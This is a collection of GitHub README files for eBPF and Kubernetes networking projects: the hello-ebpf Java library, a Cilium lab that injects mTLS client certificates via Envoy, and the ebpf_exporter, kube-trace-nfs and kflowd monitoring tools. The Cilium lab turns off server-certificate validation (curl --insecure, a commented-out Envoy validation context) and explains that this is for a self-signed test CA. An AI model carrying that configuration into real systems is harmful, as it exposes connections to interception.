- Mar 22, 2024: [Hello eBPF: Auto Layouting Structs (7)](https://mostlynerdless.de/blog/2024/03/22/hello-ebpf-auto-layouting-structs-7/)
- Apr 09, 2024: [Hello eBPF: Generating C Code (8)](https://mostlynerdless.de/blog/2024/04/09/hello-ebpf-generating-c-code-8/)
- Apr 22, 2024: [Hello eBPF: XDP-based Packet Filter (9)](https://mostlynerdless.de/blog/2024/04/22/hello-ebpf-xdp-based-packet-filter-9/)
- May 21, 2024: [Hello eBPF: Global Variables (10)](https://mostlynerdless.de/blog/2024/05/21/hello-ebpf-global-variables-10/)
- Jul 02, 2024: [Hello eBPF: BPF Type Format and 13 Thousand Generated Java Classes (11)](https://mostlynerdless.de/blog/2024/07/02/hello-ebpf-bpf-type-format-and-13-thousand-generated-java-classes-11/)
- Jul 30, 2024: [Hello eBPF: Write your eBPF application in Pure Java (12)](https://mostlynerdless.de/blog/2024/07/30/hello-ebpf-write-your-ebpf-application-in-pure-java-12/)
- Aug 13, 2024: [Hello eBPF: A Packet Logger in Pure Java using TC and XDP Hooks (13)](https://mostlynerdless.de/blog/2024/08/13/hello-ebpf-a-packet-logger-in-pure-java-using-tc-and-xdp-hooks-13/)
- Aug 27, 2024: [Hello eBPF: Building a Lightning Fast Firewall with Java & eBPF (14)](https://mostlynerdless.de/blog/2024/08/27/hello-ebpf-building-a-lightning-fast-firewall-with-java-ebpf-14/)
- Sep 10, 2024: [Hello eBPF: Collection of Resources for eBPF (14.5)](https://mostlynerdless.de/blog/2024/09/10/hello-ebpf-collection-of-resources-for-ebpf-14-5/)
- Sep 10, 2024: [Hello eBPF: Writing a Linux scheduler in Java with eBPF (15)](https://mostlynerdless.de/blog/2024/09/10/hello-ebpf-writing-a-linux-scheduler-in-java-with-ebpf-15/)
- Dec 03, 2024: [Hello eBPF: Control task scheduling with a custom scheduler written in Java (16)](https://mostlynerdless.de/blog/2024/12/03/hello-ebpf-control-task-scheduling-with-a-custom-scheduler-written-in-java-16/)

Examples
--------

I wrote a few samples that showcase the usage of the library in the [bpf-samples](bpf-samples) module,
you can use them as a starting point for your own eBPF programs.

| Inspiration | Name and Java Class                                                                                                        | Description                                                                |
|-------------|----------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------|
|             | [HelloWorld](bpf-samples/src/main/java/me/bechberger/ebpf/samples/HelloWorld.java)                                         | A simple hello world example                                               |
|             | [LogOpenAt2Call](bpf-samples/src/main/java/me/bechberger/ebpf/samples/LogOpenAt2Calls.java)                                | Logs all openat2 calls                                                     |
| Ansil H     | [RingSample](bpf-samples/src/main/java/me/bechberger/ebpf/samples/RingSample.java)                                         | Record openat2 calls in a ring buffer                                      |
|             | [HashMapSample](bpf-samples/src/main/java/me/bechberger/ebpf/samples/HashMapSample.java)                                   | Record openat2 calls in a hash map                                         |
|             | [XDPDropEveryThirdPacket](bpf-samples/src/main/java/me/bechberger/ebpf/samples/XDPDropEveryThirdPacket.java)               | Use XDP to block every third incoming packet                               |
| sematext    | [XDPPacketFilter](bpf-samples/src/main/java/me/bechberger/ebpf/samples/XDPPacketFilter.java)                               | Use XDP to block incoming packages from specific URLs in Java              |
| sematext    | [XDPPacketFilter2](bpf-samples/src/main/java/me/bechberger/ebpf/samples/XDPPacketFilter2.java)                             | The previous example but with the eBPF program as C code                   |
|             | [TCDropEveryThirdOutgoingPacket](bpf-samples/src/main/java/me/bechberger/ebpf/samples/TCDropEveryThirdOutgoingPacket.java) | Implement a Traffic Control to block every third outgoing packet at random |
|             | [PacketLogger](bpf-samples/src/main/java/me/bechberger/ebpf/samples/PacketLogger.java)                                     | TC and XDP based packet logger, capturing incoming and outgoing packets    |
| nfil.dev    | [CGroupBlockHTTPEgress](bpf-samples/src/main/java/me/bechberger/ebpf/samples/CGroupBlockHTTPEgress.java)                   | Block all outgoing HTTP packets using cgroups                              |
|             | [demo.ForbiddenFile](bpf-samples/src/main/java/me/bechberger/ebpf/samples/demo/ForbiddenFile.java)                         | Block access to a specific file via openat2                                |
|             | [Firewall](bpf-samples/src/main/java/me/bechberger/ebpf/samples/Firewall.java)                                             | A simple firewall that blocks all incoming packets                         |
|             | [FirewallSpring](bpf-samples/src/main/java/me/bechberger/ebpf/samples/FirewallSpring.java)                                 | A spring boot based web front-end for the Firewall                         |
|             | [MinimalScheduler](bpf-samples/src/main/java/me/bechberger/ebpf/samples/MinimalScheduler.java)                             | A minimal Linux scheduler                                                  | 

Running the Examples
--------------------
Be sure to run the following in a shell with root privileges that uses JDK 22:

```shell
# in the project directory
./run.sh EXAMPLE_NAME

# list all examples
./run.sh
```

This allows you to easily run the example from above:

```
> ./build.sh
>  ./run.sh XDPDropEveryThirdPacket
Packet count 0
Packet count 2
Packet count 3
Packet count 5
Packet count 6
Packet count 8
Packet count 9
Packet count 11
```

You can use the `debug.sh` to run an example with a debugger port open at port 5005.

Build
-----
To build the project, make sure you have all prerequisites installed, then just run:

```shell
./build.sh
```

Usage as a library
------------------
The library is available as a maven package:

```xml
<dependency>
    <groupId>me.bechberger</groupId>
    <artifactId>bpf</artifactId>
    <version>0.1.1-scx-enabled-SNAPSHOT</version>
</dependency>
```

You might have to add the https://s01.oss.sonatype.org/content/repositories/releases/ repo:
```xml
<repositories>
    <repository>
        <id>snapshots</id>
        <url>https://s01.oss.sonatype.org/content/repositories/snapshots/</url>
        <releases>
            <enabled>false</enabled>
        </releases>
        <snapshots>
            <enabled>true</enabled>
        </snapshots>
    </repository>
</repositories>
```

<details>
<summary>You have to copy the .mvn/jvm.config file and add the annotation processor to your project.</summary>
To properly use hello-ebpf as a library, you have to allow the maven compiler to access all the required internal
APIs. You can do this by copying the `.mvn/jvm.config` file from this repository to your project.

Furthermore, you have to add the annotation processor to your project:

```xml
<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-compiler-plugin</artifactId>
  <version>3.8.0</version>
  <configuration>
    <annotationProcessors>
      <annotationProcessor>me.bechberger.ebpf.bpf.processor.Processor</annotationProcessor>
    </annotationProcessors>
    <compilerArgs>
      <arg>-Xplugin:BPFCompilerPlugin</arg>
    </compilerArgs>
  </configuration>
</plugin>
```

</details>

Plans
-----

A look ahead into the future, so you know what to expect:

- Implement more features related to libbpf and eBPF
  - cgroups support
- More documentation
- Support for macros

These plans might change, but I'll try to keep this up to date.
I'm open to suggestions, contributions, and ideas.

Testing
-------
Tests are run using [JUnit 5](https://junit.org/junit5/) and `./mvnw test`.
You can either run

```shell
./mvnw test -Dmaven.test.skip=false
```

or you can run the tests in a container using `testutil/bin/java`: 

```shell
./mvnw test -Djvm=testutil/bin/java -Dmaven.test.skip=false
```

This requires [virtme](https://github.com/ezequielgarcia/virtme) (`apt install virtme`), python 3, and docker to be installed.
You can run custom commands in the container using `testutil/run-in-container.sh`.
Read more in the [testutil/README.md](testutil/README.md).

I'm unable to get it running in the CI, so I'm currently running the tests locally.

Contributing
------------
Contributions are welcome; just open an 
[issue](https://github.com/parttimenerd/hello-ebpf/issues/new) or a 
[pull request](https://github.com/parttimenerd/hello-ebpf/pulls).
Discussions take place in the [discussions](https://github.com/parttimenerd/hello-ebpf/discussions)
section of the GitHub repository.

I'm happy to include more example programs, API documentation, or helper methods,
as well as links to repositories and projects that use this library.

License
-------
Apache 2.0, Copyright 2023 SAP SE or an SAP affiliate company, Johannes Bechberger and contributors

_This is a side project. The amount of time I can invest might vary over time._"
hmonsalv/cilium-inject-mtls,8,1,8,0,Makefile,A lab showing how to inject mTLS certs into requests with Cilium Service Mesh L7 Envoy advance feature.,2024-05-18T15:56:27Z,2025-04-08T02:22:47Z,2,"# Cilium Inject mTLS

## About This Lab

In this lab we are going to make use of a `Cilium Service Mesh` Envoy L7 advanced feature to redirect all traffic for a given destination to an `Envoy listener` where we will inject an `mTLS` (Mutual TLS) client certificate.

This is specially usefull when you want to communicate from your k8s cluster to a backend service that requires mTLS authentication, and you don't want to modify your application code to handle mTLS.

This scenario is also applicable when you want to use a third-party solution that offers some CRDs to interact with a custom backend, but this CRD doesn't support mTLS authentication natively. An example could be `Flux CD` `notification-controller` that provides a `Provider` CRD where you can define a generic webhook (see [here](https://fluxcd.io/flux/components/notification/providers/#generic-webhook)) to send notifications to a custom backend that you might want to build enforcing mTLS authentication, but this `Provider` CRD doesn't support mTLS natively to inject the client certificate to the requests.

> **Remark:** while this lab will give you step-by-step instructions to complete it successfully, it's recommended to have some knowledge of `Cilium Service Mesh` and `Envoy`. You can check this talk from the KubeCon EU 2024 where my coleague [@edgrz](https://github.com/edgrz) and I talk in depth about this Cilium feature that allows you to redirect specific traffic in your k8s cluster to an Envoy proxy to apply advanced L7 configurations: [Cilium + eBPF Day - KubeCon 2024 - Meshing It Up Securely](https://www.youtube.com/watch?v=kC8efabCH6s&list=PLj6h78yzYM2PHDqy_nINY8-462uYzb18d&index=10).

## Lab Environment

### Diagram

![Cilium Inject mTLS Diagram](./assets/diagram.png)

> **Note:** the IPs of the containers might vary depending on your environment.

## Pre-requisites

- [cfssl](https://formulae.brew.sh/formula/cfssl) installed.
- [jq](https://jqlang.github.io/jq/download/) installed.
- [make](https://opensource.com/article/18/8/what-how-makefile) installed.
- [Hubble CLI](https://docs.cilium.io/en/stable/gettingstarted/hubble_setup/#install-the-hubble-client) installed (Optional).
- [Curl](https://formulae.brew.sh/formula/curl) installed (Optional).

## Let's Get Started

### Clone This Repository

First, clone this repository.
  
```bash
git clone https://github.com/hmonsalv/cilium-inject-mtls.git
cd cilium-inject-mtls
```

### Install Kind Kubernetes Cluster

Then create a kind k8s cluster with Cilium CNI and Service Mesh features required for this lab, you will need to follow these instructions:

- Install [kind cluster](./kubernetes/kind/README.md).
- Install [Cilium](./kubernetes/cilium/README.md) in the kind cluster.

### Generate Certificates

In order to create all the certificates needed for this lab, you need to run the following make target (be sure to be on the root folder of this repository):

```bash
make all
```

This will create the  `./certs` folder and inside it will generate a self-signed CA (Root + Intermediate CA), a server certificate/key pair, and a client certificate/key pair issued by that CA that will be used for mTLS.

### Start the HTTPS Proxy Server (backend)

Now you can start the HTTPS proxy server `haproxy`:

```bash
docker-compose up -d
```

You can observe that it started 2 containers (as described in the diagram above):

- the `haproxy` container that listens on port `8083` and enforces mTLS authentication, redirecting all traffic to the `echo-server` container.
- and the `echo-server` container that listens on port `8081` acting as an echo HTTP server that responses with the request (and all its headers) that just arrived.

> **Note:** both containers use the `kind` docker network for the sake of simplicity, as we are going to reach `haproxy` later on in this lab from a `Cilium Envoy listener` running inside the `cilium` pod of the `kind` k8s cluster (which runs in the `kind` docker network as well).

### Test Connectivity to the HTTPS Proxy Server

#### Create a Curl Pod

From the root folder of this repository, export the kubeconfig file to interact with the kind k8s cluster:

```bash
export KUBECONFIG=./kubernetes/cilium-inject-mtls-demo.config
```

Let's create in the kind k8s cluster a `curl` pod in the `mtls-inject` namespace to perform some connectivity tests (notice that we are creating a secret with the client certificate and private key and mounting it in the pod's `/certs` folder):

```bash
kubectl create namespace mtls-inject
kubectl create --namespace mtls-inject secret tls tls-client-cert --key ./certs/client.key --cert ./certs/client.pem
cat<<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: curl
  namespace: mtls-inject
spec:
  containers:
    - name: curl
      image: curlimages/curl:latest
      command:
        - sleep
        - ""3600""
      resources:
        requests:
          cpu: 10m
          memory: 10Mi
        limits:
          cpu: 200m
          memory: 256Mi
      volumeMounts:
        - name: certs
          readOnly: true
          mountPath: ""/certs""
  volumes:
    - name: certs
      secret:
        secretName: tls-client-cert
EOF
```

The `curl` pod should be running and the client certificate mounted in the `/certs` folder:

```bash
â¯ kubectl exec -it curl -n mtls-inject -- ls -lrt /certs
total 0
lrwxrwxrwx    1 root     root            14 Mar 28 17:49 tls.key -> ..data/tls.key
lrwxrwxrwx    1 root     root            14 Mar 28 17:49 tls.crt -> ..data/tls.crt
```

#### Get the IP of the HTTPS Proxy Server

If you remember, the `haproxy` container is running in the kind docker network, so this means that from the kind k8s clusters that also runs in such network, we can reach the `haproxy` container by its IP.

Let's get the IP of the `haproxy` container:

```bash
export HAPROXY_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' cilium-inject-mtls-example-haproxy-1)
echo $HAPROXY_IP
```

In my case, the IP of the `haproxy` container is `172.18.0.4`, but you might get a different one depending on your environment.

#### Curl to the HTTPS Proxy Server

Let's verify that the `haproxy` works as expected and when we specify a valid client cert issued by the CA, we get an echo response:

```bash
â¯ kubectl exec -it curl -n mtls-inject -- curl --insecure --cert /certs/tls.crt https://$HAPROXY_IP:8083
{
    ""args"": {},
    ""authorization"": null,
    ""full_path"": ""/?"",
    ""headers"": {
        ""Accept"": ""*/*"",
        ""Host"": ""172.18.0.4:8083"",
        ""User-Agent"": ""curl/8.7.1"",
        ""X-Forwarded-For"": ""172.18.0.2"",
        ""X-Forwarded-Proto"": ""https"",
        ""X-Ssl"": ""1"",
        ""X-Ssl-Client-Cn"": ""E40596F3-458E-4FAF-8A08-F539FD6B3575"",
        ""X-Ssl-Client-Dn"": ""/C=AU/ST=New South Wales/O=Panubo/CN=E40596F3-458E-4FAF-8A08-F539FD6B3575"",
        ""X-Ssl-Client-Notafter"": ""290327162700Z"",
        ""X-Ssl-Client-Notbefore"": ""240328162700Z"",
        ""X-Ssl-Client-Verify"": ""0"",
        ""X-Ssl-Issuer"": ""/C=AU/ST=New South Wales/O=Panubo/CN=Panubo Intermediate TEST 2022 G1""
    },
    ""method"": ""GET"",
    ""path"": """"
}
```

But when we don't specify the client certificate, we get an SSL error as expected:

```bash
â¯ kubectl exec -it curl -n mtls-inject -- curl --insecure https://$HAPROXY_IP:8083
curl: (56) OpenSSL SSL_read: OpenSSL/3.1.4: error:0A00045C:SSL routines::tlsv13 alert certificate required, errno 0
command terminated with exit code 56
```

> **Note:** when curling to the `haproxy`, it serves in the TLS handshake a server certificate issued by the self-signed CA, which by default our system doesn't trust, so we need to either specify the `--cacert` option with the CA certificate or disable the SSL verification with the `--insecure` or `-k` option. In the example we used the latter for the sake of simplicity.

### Leveraging Cilium Service Mesh

Now we are going to leverage `Cilium Service Mesh` capabilities to redirect all traffic that goes to the `haproxy` container to an `Envoy listener` where we will inject the client mTLS client certificate.

For this purpose we will create the following Cilium CRs (custom resources):

- A `CiliumClusterwideEnvoyConfig` (`ccec`) that will define a Envoy listener (proxy) that injects the mTLS client certificate to all request that arrive, and send the request to the actual destination (the `haproxy` IP:port).
- A `CiliumNetworkPolicy` (`cnp`) that will redirect all traffic that goes to the `haproxy` container's IP:port to that Envoy listener.

#### Create Client Certificate Secret on cilium-secrets Namespace

Cilium Envoy Configs can only load by default certificates from the `cilium-secrets` namespace, so we need to create the client certificate secret in that namespace:

```bash
kubectl create --namespace cilium-secrets secret tls tls-client-cert --key ./certs/client.key --cert ./certs/client.pem
```

#### Create the CiliumNetworkPolicy

The following `cnp` redirects all egress traffic in `mtls-inject` namespace with destination `haproxy` IP:port to the envoy listener `mtls-injection-listener` defined in `mtls-injection-envoy` `cec`:

```bash
cat<<EOF | kubectl apply -f -
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: mtls-injection-policy
  namespace: mtls-inject
spec:
  endpointSelector: {}
  egress:
    - toEndpoints:
        - matchLabels:
            io.kubernetes.pod.namespace: kube-system
            k8s-app: kube-dns
      toPorts:
        - ports:
            - port: ""53""
              protocol: UDP
          rules:
            dns:
              - matchPattern: ""*""
    - toEndpoints:
        - {}
    - toCIDR:
      - $HAPROXY_IP/32 
      toPorts:
      - ports:
        - port: '8083'
          protocol: TCP
        listener:
          envoyConfig:
            kind: CiliumClusterwideEnvoyConfig
            name: mtls-injection-envoy
          name: mtls-injection-listener
EOF
```

#### Create the CiliumClusterwideEnvoyConfig

The following `ccec` defines an Envoy listener `mtls-injection-listener` that will inject the mTLS client certificate `tls-client-cert` from the `cilium-secrets` namespace to all request that arrive and send that request to the `haproxy` IP:port:

```bash
cat<<EOF | kubectl apply -f -
apiVersion: cilium.io/v2
kind: CiliumClusterwideEnvoyConfig
metadata:
  name: mtls-injection-envoy
spec:
  resources:
  - ""@type"": type.googleapis.com/envoy.config.listener.v3.Listener
    name: mtls-injection-listener
    filter_chains:
    - filters:
      - name: envoy.filters.network.tcp_proxy
        typed_config:
          ""@type"": type.googleapis.com/envoy.extensions.filters.network.tcp_proxy.v3.TcpProxy
          stat_prefix: tls_stats
          cluster: ""internal-tls-cluster""
  - ""@type"": type.googleapis.com/envoy.config.cluster.v3.Cluster
    name: ""internal-tls-cluster""
    transport_socket:
      name: envoy.transport_sockets.tls
      typed_config:
        ""@type"": type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.UpstreamTlsContext
        sni: $HAPROXY_IP
        common_tls_context:
          alpn_protocols:
          - http/1.1
          tls_certificate_sds_secret_configs:
          - name: cilium-secrets/tls-client-cert
          # validation_context_sds_secret_config: // removing, so that the server certificate is not validated
            # From: kubectl create secret generic public-cacert -n cilium-secrets --from-file=ca.crt=./certs/ca.crt
            #name: cilium-secrets/public-cacert
    connect_timeout: 55s
    type: STATIC
    load_assignment:
      cluster_name: internal-tls-cluster
      endpoints:
      - lb_endpoints:
        - endpoint:
            address:
              socket_address:
                address: $HAPROXY_IP
                port_value: 8083
EOF
```

> **Note:** pay attention to the `validation_context` of the `UpstreamTlsContext` is commented out, which means that Envoy proxy will not validate the server certificate. We have configured it like this because the `haproxy` server serves a self-signed certificate that our system doesn't trust by default. This is the same as using with curl the `--insecure` option. If we would want to validate the `haproxy` server's certificate, then we would need to create the `public-cacert` in `cilium-secrets` namespace from the `./certs/ca.crt` file and reference it in the `validation_context_sds_secret_config.name` field.

### Test Connectivity to the HTTPS Proxy Server via Cilium Envoy

If we now send an HTTP request from the `curl` pod to the `haproxy` container ***without specifying any client certificate***, we should get the same response as before, because now the mTLS client certificate is injected by the Envoy proxy:

```bash
â¯ kubectl exec -it curl -n mtls-inject -- curl http://$HAPROXY_IP:8083
{
    ""args"": {},
    ""authorization"": null,
    ""full_path"": ""/?"",
    ""headers"": {
        ""Accept"": ""*/*"",
        ""Host"": ""172.18.0.4:8083"",
        ""User-Agent"": ""curl/8.7.1"",
        ""X-Forwarded-For"": ""172.18.0.2"",
        ""X-Forwarded-Proto"": ""https"",
        ""X-Ssl"": ""1"",
        ""X-Ssl-Client-Cn"": ""E40596F3-458E-4FAF-8A08-F539FD6B3575"",
        ""X-Ssl-Client-Dn"": ""/C=AU/ST=New South Wales/O=Panubo/CN=E40596F3-458E-4FAF-8A08-F539FD6B3575"",
        ""X-Ssl-Client-Notafter"": ""290327162700Z"",
        ""X-Ssl-Client-Notbefore"": ""240328162700Z"",
        ""X-Ssl-Client-Verify"": ""0"",
        ""X-Ssl-Issuer"": ""/C=AU/ST=New South Wales/O=Panubo/CN=Panubo Intermediate TEST 2022 G1""
    },
    ""method"": ""GET"",
    ""path"": """"
}
```

> **Note:** pay attention to the curl command, now we are using `HTTP`, and not `HTTPS` in the URL. This is because now it's the Envoy proxy the one that will handle the `HTTPS` connection to the actual destination and keep the end-to-end encryption.

### Inspect the Traffic with Hubble

`Hubble` CLI connects to `hubble-relay` backend to inspect traffic, so in a new terminal we need to port-forward the `hubble-relay` service first:

```bash
kubectl port-forward -n kube-system svc/hubble-relay 4245:80
```

Open another terminal and run the following command to observe all egress traffic with destination to the `haproxy` container's IP:

```bash
hubble observe --to-ip $HAPROXY_IP -f
```

We can see with `Hubble` that the traffic from `mtls-inject/curl` pod with destination to the `haproxy` container's IP:port has been redirected to the envoy proxy (see `to-proxy` action), and from there the envoy proxy establishes another `TCP` connection to the `haproxy` and sends the `HTTPS` request:

![Hubble Observe](./assets/hubble-observe.png)

### Clean Up the Lab Environment

To clean up the lab environment, you can run the following commands:

```bash
kind delete cluster --name cilium-inject-mtls-demo
docker-compose down
```

## Related Projects

This lab makes use of some resources from [panubo/mtls-example](https://github.com/panubo/mtls-example) GitHub repository, in particular:

- Makefile to generate all certificates.
- `haproxy` configuration.
- `"
digitalocean-labs/ebpf_exporter,28,3,28,7,Go,a pure-Go Prometheus exporter for the eBPF Linux subsystem,2024-05-21T17:23:19Z,2025-09-29T18:49:57Z,20,"# ebpf_exporter

A pure-Go Prometheus exporter for the eBPF Linux subsystem. It exports metrics for currently loaded eBPF resources like programs, maps, and links.

It was partially inspired by the built-in metrics provided by [github.com/cloudflare/ebpf_exporter](https://github.com/cloudflare/ebpf_exporter). While that project was built for creating _custom_ metrics out of eBPF maps, this project aims to be a bit smaller in scope, by only exporting metrics based on information that Linux provides out-of-the-box, more akin to `node_exporter`.

It's built on top of the [Cilium eBPF Go library](github.com/cilium/ebpf).

IMPORTANT: `ebpf_exporter` must be run as a privileged process. Specifically, the `CAP_SYS_ADMIN` capability is required; `CAP_BPF` and `CAP_PERFMON` are insufficient, even on 6.x kernels.

## Design Goals

- Pure Go (never any CGO, and no `libbpf`)
- Run on any modern Linux (4.x) out of the box
- No custom eBPF metrics; only those provided by Linux by default
- Follow best practices of Prometheus exporters

## Metrics

Most metrics will have an `id` style key, on which the `info` metrics can be joined to get more information.

### Programs

- `ebpf_program_info`
- `ebpf_program_run_count`
- `ebpf_program_run_duration_nanoseconds`

#### Program stats collection

The exporter offers optional collection BPF program stats (run count and total duration), a feature offered by the Linux kernel since 5.1. In this exporter, it's only available if running on Linux 5.8 or higher.

There are 3 modes (`--prog-stats-mode`):

- `disabled`: This is the default. BPF program stats are not enabled and not collected.
- `sample`: BPF program stats are enabled only for the duration of a sampling interval, defined by the required `--prog-stats-sample-interval` and `--prog-stats-sample-duration` flags. Metrics will still be collected and exported, but they will not be incremented outside of the desired interval.
- `enabled`: BPF program stats are always enabled and collected. This is not recommended in production, especially for latency-sensitive eBPF programs, due to overhead.

NOTE: When BPF stats are enabled, they are enabled for all currently loaded BPF programs. Linux does not offer a feature to selectively enable statistics for only a subset of current programs.

### Maps

- `ebpf_map_info`
- `ebpf_map_entries`

### Links

- `ebpf_link_info`
- `ebpf_link_cgroup_info`
- `ebpf_link_netns_info`
- `ebpf_link_tracing_info`
- `ebpf_link_xdp_info`
- `ebpf_link_tcx_info`
- `ebpf_link_netfilter_info`
- `ebpf_link_netkit_info`
- `ebpf_link_kprobe_info`
- `ebpf_link_perf_event_info`

### BTF

- `ebpf_btf_info`
"
4rivappa/kube-trace-nfs,40,1,40,0,Python,eBPF-Based NFS Telemetry Exporter for Kubernetes,2024-05-31T14:45:38Z,2025-09-05T16:51:07Z,12,"# Kube Trace NFS

![image](https://github.com/4rivappa/kube-trace-nfs/assets/114223788/3e67ef41-13ca-424a-8c1c-e5fb0cc7ee26)

## Overview

Kube Trace NFS is designed to **observe NFS connections in a Kubernetes cluster** by collecting telemetry data from a node-level **eBPF program**, utilizing the BCC tool. Inspired by the `nfsslower` tool and other **BCC utilities**, this application focuses specifically on NFS operations such as **reads, writes, opens, and getattrs**.

Currently, the application collects **node-level metrics**, with **pod-level metrics** and the ranking of the **most accessed files** planned for upcoming versions. Collected data can be **exported to monitoring tools** like Prometheus and **visualized on platforms** such as Grafana. This comprehensive data provides valuable insights into how NFS traffic is distributed across the cluster.

## Motivation

Many cloud providers offer **storage through NFS protocol**, which can be attached to **Kubernetes clusters via CSI** (Container Storage Interface). However, the monitoring provided by storage providers often **aggregates data for all NFS client connections**. This aggregation makes it **difficult to isolate and monitor specific connections** and their operations such as reads, writes, and getattrs to the NFS server. This project **addresses this challenge** by offering detailed **telemetry data of NFS requests** from clients to the server, facilitating both node-level and pod-level analysis. Leveraging Prometheus and Grafana, this data **enables comprehensive analysis of NFS traffic**, empowering users to gain valuable insights into their cluster's NFS interactions.

## Features

- **[eBPF](https://ebpf.io/what-is-ebpf#what-is-ebpf)-based** efficient and low-overhead monitoring
- Provide **byte throughput** metrics for read/write operations
- **Latency and occurrence rate** of read, write, open, and getattr operations
- Potential for metrics related to **IOPS and file-level access**

## Architecture

![image](https://github.com/4rivappa/kube-trace-nfs/assets/114223788/7f87e006-0965-4363-986e-2fddd77f8304)

> K (Kernel): kprobe, eBPF program

> U (User space): kube-trace-nfs, nfs-client, other pods

The `nfs client` establishes a connection with the `nfs server` to furnish storage for pods, a process routed through kernel programs. `kube-trace-nfs` attaches `eBPF program` to nfs `kprobes` to capture metrics concerning events occurring within nfs clients. These metrics are stored in **eBPF maps** and undergo processing for event analysis. Events involving read, write, open, and getattr operations are forwarded to the user space component `kube-trace-nfs`. Subsequently, these values are exported to **Prometheus**, from where the data can be leveraged in various visualization tools such as **Grafana**.

## Quick Installation

Kube Trace NFS can be installed from GHCR using Helm

```bash
VERSION=${$(curl -sL https://api.github.com/repos/4rivappa/kube-trace-nfs/releases/latest | jq -r .name)#v}
helm install kube-trace-nfs oci://ghcr.io/4rivappa/kube-trace-nfs --version $VERSION
```

After Helm install, you can access `nfs_read_bytes`, `nfs_write_bytes` metrics in prometheus
"
tarsal-oss/kflowd,68,4,68,3,C,"Kernel-based Process Monitoring on Linux Endpoints for File System, TCP and UDP Networking Events and optionally DNS, HTTP and SYSLOG Application Messages via eBPF Subsystem",2024-04-12T13:41:34Z,2025-09-03T01:09:58Z,23,"<div align=""right"">
<a href=""#"" target=""_blank""><img src=""https://img.shields.io/endpoint?url=https://tarsal-oss.github.io/kflowd/gh-stats-version.json""/></a>
<a href=""https://github.com/tarsal-oss/kflowd/actions/workflows/kflowd-ci.yml"" target=""_blank""><img src=""https://github.com/tarsal-oss/kflowd/actions/workflows/kflowd-ci.yml/badge.svg""/></a>
<a href=""#license"" target=""_blank""><img src=""https://img.shields.io/badge/License-GPL_v2-lightgrey.svg""/></a>
</div>

<picture>
<source media=""(prefers-color-scheme: dark)"" srcset=""https://github.com/tarsal-oss/kflowd/assets/108887718/d2d59b0d-947a-4f76-ac7e-db121974fc58"" width=""240px""/>
<img src=""https://github.com/tarsal-oss/kflowd/assets/108887718/fdf5f7de-9c9f-43e0-8f39-068f9b71a9f1"" width=""240px""/>
</picture>

## Kernel-based Process Monitoring on Linux Endpoints via eBPF

### kflowd runs as agent on Linux endpoints to monitor processes via eBPF kernel subsystem for filesystem and TCP and UDP networking events, enabling immediate threat and anomaly detection on suspicious activities.
#### Advanced non-ebpf related features such as DNS, HTTP and SYSLOG application message decoding, checksum calculation for virus detection, process and file versioning for vulnerability detection and file device, network interface and user-group identification for files and processes can be enabled via open-binary plugin modules.<br>Pre-built kflowd and kflowd-plugins packages can be downloaded for quick installation from the [Releases](https://github.com/tarsal-oss/kflowd/releases) section.

If you would like to join our community Slack channel please send an email to [devs@tarsal.co](mailto:devs@tarsal.co) to receive an invitation. You can also contact us directly at [kflow@tarsal.co](mailto:kflow@tarsal.co) for any questions.

kflowd contains an eBPF program running in kernel context and its control application running in userspace.<br>
The eBPF program traces kernel functions to monitor processes based on file system and networking events. Events are aggregated into records and submitted into a ringbuffer where they are polled by the userspace control application. All Records are enriched with process information and then converted into a message in JSON output format.<br>
Final messages are printed to stdout console and can be sent via UDP protocol to specified hosts for ingestion in a security data pipeline.

kflowd runs on Linux kernels 5.10+ and is built with the **libbpf+CO-RE** (Compile-Once-Run-Everywhere) eBPF development toolchain using **BTF** (BPF Type Format) to allow portability by avoiding dependencies on differences in kernel headers between kernel versions on deployment.
<div align=""left"">
<picture>
<img src=""https://github.com/user-attachments/assets/7d2dd1cf-0b77-4049-91e3-41151d9f5ab4"" width=""1000"">
</picture>
</div>

### JSON Output

kflowd outputs JSON messages generated for each record of aggregated file system and TCP, UDP networking events and optionally DNS, HTTP and SYSLOG application messages in the formats as shown in the following examples:

<details open>
<summary>&nbsp;Filesystem Record</summary>

```
{
  ""InfoSequenceNumber"": 1,
  ""InfoTimestamp"": ""Thu, Apr 04 2024 15:34:35.643031330 UTC"",
  ""InfoMonitor"": ""filesystem"",
  ""InfoHostName"": ""dev.kflow.co"",
  ""InfoHostIP"": ""38.110.1.24"",
  ""InfoSystem"": ""Linux"",
  ""InfoKernel"": ""6.1.0-10-amd64"",
  ""InfoVersion"": ""kflowd-v0.9.1"",
  ""InfoUptime"": 21.262713426,
  ""ProcParent"": ""sshd"",
  ""Proc"": ""sftp-server"",
  ""ProcVersion"": ""1:9.2p1-2+deb12u1"",
  ""ProcUser"": ""dirk"",
  ""ProcGroup"": ""dirk"",
  ""ProcPPID"": 183546,
  ""ProcPID"": 183547,
  ""ProcTID"": 183547,
  ""ProcUID"": 1002,
  ""ProcGID"": 1002,
  ""ProcAge"": 2.408293862,
  ""FilePath"": ""/home/dirk/"",
  ""File"": ""malware"",
  ""FileVersion"": ""0.9"",
  ""FileMode"": ""regular"",
  ""FileEventCount"": 4,
  ""FileEvents"": {
    ""OPEN"": 1,
    ""MODIFY"": 2,
    ""CLOSE_WRITE"": 1
  },
  ""FileEventsDuration"": 0.811829334,
  ""FileInode"": 19567988,
  ""FileInodeLinkCount"": 1,
  ""FileDevice"": ""902h:/dev/md2:/:ext4"",
  ""FilePermissions"": ""0755/-rwxr-xr-x"",
  ""FileUser"": ""dirk"",
  ""FileGroup"": ""dirk"",
  ""FileUID"": 1002,
  ""FileGID"": 1002,
  ""FileSize"": 41,
  ""FileSizeChange"": 41,
  ""FileAccessTime"": ""Thu, Apr 04 2024 15:12:01.435718956 UTC"",
  ""FileStatusChangeTime"": ""Thu, Apr 04 2024 15:34:35.154106191 UTC"",
  ""FileModificationTime"": ""Thu, Apr 04 2024 15:34:35.154106191 UTC"",
  ""FileModificationTimeChange"": 0.327993681,
  ""FileMD5"": ""96760f46bd29ba986279f22bed9839f5"",
  ""FileSHA256"": ""72c58c2d02ae3a87f521594373433b7d05477c4994fc0ab4376827cadb29ba7e""
}
```
</details>

<details open>
<summary>&nbsp;UDP + DNS Networking Record</summary>

```
{
  ""InfoSequenceNumber"": 2,
